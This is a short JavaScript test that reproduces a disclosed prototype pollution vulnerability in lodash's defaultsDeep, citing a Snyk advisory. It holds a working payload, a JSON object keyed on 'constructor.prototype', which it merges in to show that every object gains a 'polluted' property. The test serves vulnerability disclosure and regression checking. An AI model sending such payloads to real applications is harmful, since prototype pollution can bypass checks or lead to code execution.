//https://security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-460129
test("prototype pollution in @sailshq/lodash.defaultsDeep", () => {
  expect({}.polluted).toBe(undefined);
  const mergeFn = require("lodash").defaultsDeep;
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
  mergeFn({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});
